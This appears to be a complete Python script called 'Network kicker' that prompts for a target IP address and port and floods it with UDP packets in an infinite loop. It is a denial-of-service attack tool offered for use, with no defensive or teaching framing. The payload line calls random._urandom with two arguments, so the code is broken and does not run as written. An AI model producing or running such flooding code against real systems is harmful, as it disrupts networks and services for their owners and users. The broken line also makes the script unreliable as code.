import socket
import random
sock  = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(0, 1024)
print("-" * 100)
print("Network kicker made by Senpai_Desi")
print("-" * 100)
ip = input("Target IP: ")
port = input("Port: ")

port = int(port)

while 1:
    sock.sendto(bytes,(ip, port))
    print("Sent %s packets to %s at port %s" %(len(bytes), ip, port))
